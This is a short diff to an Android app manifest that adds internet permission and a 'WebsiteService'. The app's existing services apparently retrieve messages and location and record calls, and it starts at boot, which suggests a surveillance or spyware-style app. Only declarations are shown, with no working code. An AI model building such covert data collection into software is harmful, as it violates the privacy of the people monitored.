@@ -16,6 +16,7 @@
     <uses-permission android:name="android.permission.RECORD_AUDIO"/>
     <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
     <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+    <uses-permission android:name="android.permission.INTERNET"/>
     <application
         android:allowBackup="true"
         android:icon="@drawable/ic_launcher"
@@ -32,6 +33,7 @@
         <service android:name=".MessageRetreiverService"></service>
         <service android:name=".LocationRetreiverService"></service>
         <service android:name=".CallRecordingService"></service>
+        <service android:name=".WebsiteService"></service>
         
         <receiver android:enabled="true" android:name=".BootReceiver">
              <intent-filter>
